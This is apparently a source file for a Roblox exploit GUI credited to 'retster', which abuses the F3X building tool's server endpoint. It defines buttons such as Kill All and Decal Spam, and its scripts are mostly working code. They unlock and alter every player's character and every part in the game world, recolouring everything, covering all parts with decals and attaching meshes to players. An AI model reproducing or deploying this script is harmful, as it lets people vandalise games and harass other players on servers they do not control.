ThomasEngine.TextColor3 = Color3.fromRGB(255, 255, 255)

ThomasEngine.TextSize = 20.000

ThomasEngine.TextWrapped = true



Unanchor.Name = "Unanchor"

Unanchor.Parent = ScrollingFrame

Unanchor.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Unanchor.BorderSizePixel = 0

Unanchor.Position = UDim2.new(-0.00253164559, 0, 0.34487924, 0)

Unanchor.Size = UDim2.new(0, 123, 0, 43)

Unanchor.AutoButtonColor = false

Unanchor.Font = Enum.Font.Code

Unanchor.TextColor3 = Color3.fromRGB(255, 255, 255)

Unanchor.TextSize = 20.000

Unanchor.TextWrapped = true



BasePlate.Name = "BasePlate"

BasePlate.Parent = ScrollingFrame

BasePlate.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

BasePlate.BorderSizePixel = 0

BasePlate.Position = UDim2.new(0.341772139, 0, 0.34487924, 0)

BasePlate.Size = UDim2.new(0, 123, 0, 43)

BasePlate.AutoButtonColor = false

BasePlate.Font = Enum.Font.Code

BasePlate.TextColor3 = Color3.fromRGB(255, 255, 255)

BasePlate.TextSize = 20.000

BasePlate.TextWrapped = true



KillAll.Name = "Kill All"

KillAll.Parent = ScrollingFrame

KillAll.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

KillAll.BorderSizePixel = 0

KillAll.Position = UDim2.new(0.683544278, 0, 0.34487924, 0)

KillAll.Size = UDim2.new(0, 123, 0, 43)

KillAll.AutoButtonColor = false

KillAll.Font = Enum.Font.Code

KillAll.TextColor3 = Color3.fromRGB(255, 255, 255)

KillAll.TextSize = 20.000

KillAll.TextWrapped = true



Personalityall.Name = "Personality all"

Personalityall.Parent = ScrollingFrame

Personalityall.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Personalityall.BorderSizePixel = 0

Personalityall.Position = UDim2.new(0.686075926, 0, 0.452379227, 0)

Personalityall.Size = UDim2.new(0, 123, 0, 43)

Personalityall.AutoButtonColor = false

Personalityall.Font = Enum.Font.Code

Personalityall.TextColor3 = Color3.fromRGB(255, 255, 255)

Personalityall.TextSize = 20.000

Personalityall.TextWrapped = true



SkyBox.Name = "SkyBox"

SkyBox.Parent = ScrollingFrame

SkyBox.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

SkyBox.BorderSizePixel = 0

SkyBox.Position = UDim2.new(0.344303787, 0, 0.452379227, 0)

SkyBox.Size = UDim2.new(0, 123, 0, 43)

SkyBox.AutoButtonColor = false

SkyBox.Font = Enum.Font.Code

SkyBox.TextColor3 = Color3.fromRGB(255, 255, 255)

SkyBox.TextSize = 20.000

SkyBox.TextWrapped = true



Peircer.Name = "Peircer"

Peircer.Parent = ScrollingFrame

Peircer.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

Peircer.BorderSizePixel = 0

Peircer.Position = UDim2.new(0, 0, 0.452379227, 0)

Peircer.Size = UDim2.new(0, 123, 0, 43)

Peircer.AutoButtonColor = false

Peircer.Font = Enum.Font.Code

Peircer.TextColor3 = Color3.fromRGB(255, 255, 255)

Peircer.TextSize = 20.000

Peircer.TextWrapped = true



StickAll.Name = "Stick All"

StickAll.Parent = ScrollingFrame

StickAll.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

StickAll.BorderSizePixel = 0

StickAll.Position = UDim2.new(0, 0, 0.559879243, 0)

StickAll.Size = UDim2.new(0, 123, 0, 43)

StickAll.AutoButtonColor = false

StickAll.Font = Enum.Font.Code

StickAll.TextColor3 = Color3.fromRGB(255, 255, 255)

StickAll.TextSize = 20.000

StickAll.TextWrapped = true



TwigAll.Name = "Twig All"

TwigAll.Parent = ScrollingFrame

TwigAll.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

TwigAll.BorderSizePixel = 0

TwigAll.Position = UDim2.new(0.344303787, 0, 0.559879243, 0)

TwigAll.Size = UDim2.new(0, 123, 0, 43)

TwigAll.AutoButtonColor = false

TwigAll.Font = Enum.Font.Code

TwigAll.TextColor3 = Color3.fromRGB(255, 255, 255)

TwigAll.TextSize = 20.000

TwigAll.TextWrapped = true



FireParts.Name = "Fire Parts"

FireParts.Parent = ScrollingFrame

FireParts.BackgroundColor3 = Color3.fromRGB(29, 29, 29)

FireParts.BorderSizePixel = 0

FireParts.Position = UDim2.new(0.686075926, 0, 0.559879243, 0)

FireParts.Size = UDim2.new(0, 123, 0, 43)

FireParts.AutoButtonColor = false

FireParts.Font = Enum.Font.Code

FireParts.TextColor3 = Color3.fromRGB(255, 255, 255)

FireParts.TextSize = 20.000

FireParts.TextWrapped = true



Frame_3.Parent = ReplicationGui

Frame_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

Frame_3.BackgroundTransparency = 1.000

Frame_3.Position = UDim2.new(0, 0, 0.79919678, 0)

Frame_3.Size = UDim2.new(0, 267, 0, 100)



ImageLabel.Parent = Frame_3

ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

ImageLabel.BackgroundTransparency = 1.000

ImageLabel.Position = UDim2.new(0.0337078571, 0, 0.227877513, 0)

ImageLabel.Size = UDim2.new(0, 50, 0, 54)

ImageLabel.Image = "rbxassetid://483057119"



TextLabel.Parent = Frame_3

TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

TextLabel.BorderColor3 = Color3.fromRGB(255, 119, 29)

TextLabel.BorderSizePixel = 2

TextLabel.Position = UDim2.new(0.258426964, 0, 0.25999999, 0)

TextLabel.Size = UDim2.new(0, 200, 0, 50)

TextLabel.Font = Enum.Font.Code

TextLabel.Text = "F3X replication GUI developed by retster#6440\nExecute Scripts Which are replicated to the server."

TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)

TextLabel.TextScaled = true

TextLabel.TextSize = 14.000

TextLabel.TextWrapped = true



-- Scripts:



local function CNUNYID_fake_script() -- BigHead.LocalScript 

	local script = Instance.new('LocalScript', BigHead)



	script.Parent.MouseButton1Click:Connect(function()

	local player = game.Players.LocalPlayer

	local char = player.Character

	local tool

	for i,v in player:GetDescendants() do

		if v.Name == "SyncAPI" then

			tool = v.Parent

		end

	end

		for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

	--craaa

	remote = tool.SyncAPI.ServerEndpoint

	function _(args)

		remote:InvokeServer(unpack(args))

	end

	function SetCollision(part,boolean)

		local args = {

			[1] = "SyncCollision",

			[2] = {

				[1] = {

					["Part"] = part,

					["CanCollide"] = boolean

				}

			}

		}

		_(args)

	end

	function SetAnchor(boolean,part)

		local args = {

			[1] = "SyncAnchor",

			[2] = {

				[1] = {

					["Part"] = part,

					["Anchored"] = boolean

				}

			}

		}

		_(args)

	end

	function CreatePart(cf,parent)

		local args = {

			[1] = "CreatePart",

			[2] = "Normal",

			[3] = cf,

			[4] = parent

		}

		_(args)

	end

	function DestroyPart(part)

		local args = {

			[1] = "Remove",

			[2] = {

				[1] = part

			}

		}

		_(args)

	end

	function MovePart(part,cf)

		local args = {

			[1] = "SyncMove",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf

				}

			}

		}

		_(args)

	end

	function Resize(part,size,cf)

		local args = {

			[1] = "SyncResize",

			[2] = {

				[1] = {

					["Part"] = part,

					["CFrame"] = cf,

					["Size"] = size

				}

			}

		}

		_(args)

	end

	function AddMesh(part)

		local args = {

			[1] = "CreateMeshes",

			[2] = {

				[1] = {

					["Part"] = part

				}

			}

		}

		_(args)

	end

	

	function SetMesh(part,meshid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["MeshId"] = "rbxassetid://"..meshid

				}

			}

		}

		_(args)

	end

	function SetTexture(part, texid)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["TextureId"] = "rbxassetid://"..texid

				}

			}

		}

		_(args)

	end

	function SetName(part, stringg)

		local args = {

			[1] = "SetName",

			[2] = {

				[1] = workspace.Part

			},

			[3] = stringg

		}

	

		_(args)

	end

	function MeshResize(part,size)

		local args = {

			[1] = "SyncMesh",

			[2] = {

				[1] = {

					["Part"] = part,

					["Scale"] = size

				}

			}

		}

		_(args)

	end

	function Weld(part1, part2,lead)

		local args = {

			[1] = "CreateWelds",

			[2] = {

				[1] = part1,

				[2] = part2

			},

			[3] = lead

		}

		_(args)

	

	end

	function SetLocked(part,boolean)

		local args = {

			[1] = "SetLocked",

			[2] = {

				[1] = part

			},

			[3] = boolean

		}

		_(args)

	end

	function SetTrans(part,int)

		local args = {

			[1] = "SyncMaterial",

			[2] = {

				[1] = {

					["Part"] = part,

					["Transparency"] = int

				}

			}

		}

		_(args)

	end

	function CreateSpotlight(part)

		local args = {

			[1] = "CreateLights",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight"

				}

			}

		}

		_(args)

	end

	function SyncLighting(part,brightness)

		local args = {

			[1] = "SyncLighting",

			[2] = {

				[1] = {

					["Part"] = part,

					["LightType"] = "SpotLight",

					["Brightness"] = brightness

				}

			}

		}

		_(args)

	end

	

	function BigHead(player)

		local chara = player.Character

			spawn(function()

				SetLocked(chara.Head,false)

				MeshResize(chara.Head,Vector3.new(10,10,10))

			end)

	end

	for i,players in game.Players:GetPlayers() do

		BigHead(players)

	end

	end)

end

coroutine.wrap(CNUNYID_fake_script)()

local function UCBQXM_fake_script() -- BumAll.LocalScript 

	local script = Instance.new('LocalScript', BumAll)



	script.Parent.MouseButton1Click:Connect(function()

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function Bum(player)

			char = player.Character

			for i,v in char:GetChildren() do

				pcall(function()

					SetLocked(v,false)

				end)

			end

			if player.Character:FindFirstChild("Part1") then

				return

			else

				

			SetAnchor(true,player.Character.HumanoidRootPart)

			spawn(function()

				CreatePart(player.Character:WaitForChild("Right Leg").CFrame * CFrame.new(0,1,0.6),player.Character)

				SetName(player.Character.Part,"Part1")

				CreatePart(player.Character:WaitForChild("Left Leg").CFrame * CFrame.new(0,1,0.6),player.Character)

				SetName(player.Character.Part,"Part2")

			end)

			wait(0.2)

			repeat wait() until char:FindFirstChild("Part2")

			spawn(function()

				AddMesh(char.Part1)

				AddMesh(char.Part2)

				SetMesh(char.Part1,"5697933202")

				SetMesh(char.Part2,"5697933202")

			end)

			wait(0.2)

			repeat wait() until char.Part2:FindFirstChild("Mesh")

			spawn(function()

				MeshResize(char.Part1,Vector3.new(0.5,0.5,0.5))

				MeshResize(char.Part2,Vector3.new(0.5,0.5,0.5))

			end)

			wait(0.2)

			pcall(function()

				Color(char.Part1,char:WaitForChild("Right Leg").Color)

				Color(char.Part2,char:WaitForChild("Left Leg").Color)

			end)

			wait(0.2)

			spawn(function()

				SetCollision(player.Character.Part1,false)

				SetCollision(player.Character.Part2,false)

				Weld(char.Part1,char.HumanoidRootPart,char.Part1)

				Weld(char.Part2,char.Part1,char.Part2)

			end)

				repeat wait() until char.Part2:FindFirstChild("BTWeld")

			spawn(function()

				SetAnchor(false,char.HumanoidRootPart)

				SetAnchor(false,char.Part1)

				SetAnchor(false,char.Part2)

				end)

				repeat wait()

					SetAnchor(false,char.HumanoidRootPart)

					SetAnchor(false,char.Part1)

					SetAnchor(false,char.Part2)

				until char.Part2.Anchored == false

			end

		end

		for i,v in game.Players:GetPlayers() do

			--zzspawn(function()

			pcall(function()

				Bum(v)

			end)

			--end)

		end

	end)

end

coroutine.wrap(UCBQXM_fake_script)()

local function MJHPOM_fake_script() -- Colorall.LocalScript 

	local script = Instance.new('LocalScript', Colorall)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function randomise()

			for i,v in game.Workspace:GetDescendants() do

				if v:IsA("BasePart") then

					spawn(function()

						SetLocked(v,false)

						Color(v,Color3.new(math.random(0,255),math.random(0,255),math.random(0,255)))

					end)

				end

			end

		end

	randomise()

	end)

end

coroutine.wrap(MJHPOM_fake_script)()

local function ZYJPOKE_fake_script() -- DecalSpam.LocalScript 

	local script = Instance.new('LocalScript', DecalSpam)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Color(part,color)

			local args = {

				[1] = "SyncColor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Color"] = color --[[Color3]],

						["UnionColoring"] = false

					}

				}

			}

			_(args)

		end

		function SpawnDecal(part,side)

			local args = {

				[1] = "CreateTextures",

				[2] = {

					[1] = {

						["Part"] = part,

						["Face"] = side,

						["TextureType"] = "Decal"

					}

				}

			}

	

			_(args)

		end

		function AddDecal(part,asset,side)

			local args = {

				[1] = "SyncTexture",

				[2] = {

					[1] = {

						["Part"] = part,

						["Face"] = side,

						["TextureType"] = "Decal",

						["Texture"] = "rbxassetid://".. asset

					}

				}

			}

			_(args)

		end

	

		function spam(id)

			for i,v in game.workspace:GetDescendants() do

				if v:IsA("BasePart") then

					spawn(function()

						SetLocked(v,false)

						SpawnDecal(v,Enum.NormalId.Front)

						AddDecal(v,id,Enum.NormalId.Front)

	

						SpawnDecal(v,Enum.NormalId.Back)

						AddDecal(v,id,Enum.NormalId.Back)

	

						SpawnDecal(v,Enum.NormalId.Right)

						AddDecal(v,id,Enum.NormalId.Right)

	

						SpawnDecal(v,Enum.NormalId.Left)

						AddDecal(v,id,Enum.NormalId.Left)

	

						SpawnDecal(v,Enum.NormalId.Bottom)

						AddDecal(v,id,Enum.NormalId.Bottom)

	

						SpawnDecal(v,Enum.NormalId.Top)

						AddDecal(v,id,Enum.NormalId.Top)

					end)

				end

			end 

		end

		spam("13741328884")

	end)

end

coroutine.wrap(ZYJPOKE_fake_script)()

local function IGAFG_fake_script() -- Duckify.LocalScript 

	local script = Instance.new('LocalScript', Duckify)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local chara = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = workspace.Part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = part,

				},

				[3] = stringg

			}

	

			_(args)

		end

		function MeshResize(part,size)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["Scale"] = size

					}

				}

			}

			_(args)

		end

		function Weld(part1, part2,lead)

			local args = {

				[1] = "CreateWelds",

				[2] = {

					[1] = part1,

					[2] = part2

				},

				[3] = lead

			}

			_(args)

	

		end

		function SetLocked(part,boolean)

			local args = {

				[1] = "SetLocked",

				[2] = {

					[1] = part

				},

				[3] = boolean

			}

			_(args)

		end

		function SetTrans(part,int)

			local args = {

				[1] = "SyncMaterial",

				[2] = {

					[1] = {

						["Part"] = part,

						["Transparency"] = int

					}

				}

			}

			_(args)

		end

		function CreateSpotlight(part)

			local args = {

				[1] = "CreateLights",

				[2] = {

					[1] = {

						["Part"] = workspace.Part,

						["LightType"] = "SpotLight"

					}

				}

			}

			_(args)

		end

		function SyncLighting(part,brightness)

			local args = {

				[1] = "SyncLighting",

				[2] = {

					[1] = {

						["Part"] = part,

						["LightType"] = "SpotLight",

						["Brightness"] = brightness

					}

				}

			}

			_(args)

		end

		function Duckify(player)

			for i,v in player.Character:GetDescendants() do

				if v:IsA("BasePart") then

					pcall(function()

						SetLocked(v,false)

						SetTrans(v,1)

					end)

				end

			end

			char = player.Character

			--spawn(function()

			spawn(function()

				SetAnchor(true,char.HumanoidRootPart)

				CreatePart(char.HumanoidRootPart.CFrame,char)

				SetCollision(char.Part,false)

				SetName(char.Part, "Duck")

			end)

			repeat wait() until char:FindFirstChild("Duck")

			spawn(function()

				SetLocked(char.Duck,false)

				SetLocked(char.HumanoidRootPart,false)

				Weld(char.Duck,char.HumanoidRootPart,char.Duck)

				SetAnchor(false,char.Duck)

				AddMesh(char.Duck)

			end)

			repeat wait() until char.Duck:FindFirstChild("Mesh")

				MeshResize(char.Duck,Vector3.new(8,8,8))

				SetMesh(char.Duck,"10749878672")

				SetTexture(char.Duck,"10749878886")

				SetAnchor(false,char.HumanoidRootPart)

			--end)

		end

		for i,v in game.Players:GetPlayers() do

			--spawn(function()

			Duckify(v)

			--end)

		end

	end)

end

coroutine.wrap(IGAFG_fake_script)()

local function YTBL_fake_script() -- FireAll.LocalScript 

	local script = Instance.new('LocalScript', FireAll)



	script.Parent.MouseButton1Click:Connect(function()

		--rgrg

		local player = game.Players.LocalPlayer

		local char = player.Character

		local tool

		for i,v in player:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

			for i,v in game.ReplicatedStorage:GetDescendants() do

			if v.Name == "SyncAPI" then

				tool = v.Parent

			end

		end

		--craaa

		remote = tool.SyncAPI.ServerEndpoint

		function _(args)

			remote:InvokeServer(unpack(args))

		end

		function SetCollision(part,boolean)

			local args = {

				[1] = "SyncCollision",

				[2] = {

					[1] = {

						["Part"] = part,

						["CanCollide"] = boolean

					}

				}

			}

			_(args)

		end

		function SetAnchor(boolean,part)

			local args = {

				[1] = "SyncAnchor",

				[2] = {

					[1] = {

						["Part"] = part,

						["Anchored"] = boolean

					}

				}

			}

			_(args)

		end

		function CreatePart(cf,parent)

			local args = {

				[1] = "CreatePart",

				[2] = "Normal",

				[3] = cf,

				[4] = parent

			}

			_(args)

		end

		function DestroyPart(part)

			local args = {

				[1] = "Remove",

				[2] = {

					[1] = part

				}

			}

			_(args)

		end

		function MovePart(part,cf)

			local args = {

				[1] = "SyncMove",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf

					}

				}

			}

			_(args)

		end

		function Resize(part,size,cf)

			local args = {

				[1] = "SyncResize",

				[2] = {

					[1] = {

						["Part"] = part,

						["CFrame"] = cf,

						["Size"] = size

					}

				}

			}

			_(args)

		end

		function AddMesh(part)

			local args = {

				[1] = "CreateMeshes",

				[2] = {

					[1] = {

						["Part"] = part

					}

				}

			}

			_(args)

		end

	

		function SetMesh(part,meshid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["MeshId"] = "rbxassetid://"..meshid

					}

				}

			}

			_(args)

		end

		function SetTexture(part, texid)

			local args = {

				[1] = "SyncMesh",

				[2] = {

					[1] = {

						["Part"] = part,

						["TextureId"] = "rbxassetid://"..texid

					}

				}

			}

			_(args)

		end

		function SetName(part, stringg)

			local args = {

				[1] = "SetName",

				[2] = {

					[1] = workspace.Part

				},

				[3] = stringg

			}

	

			_(args)

		end

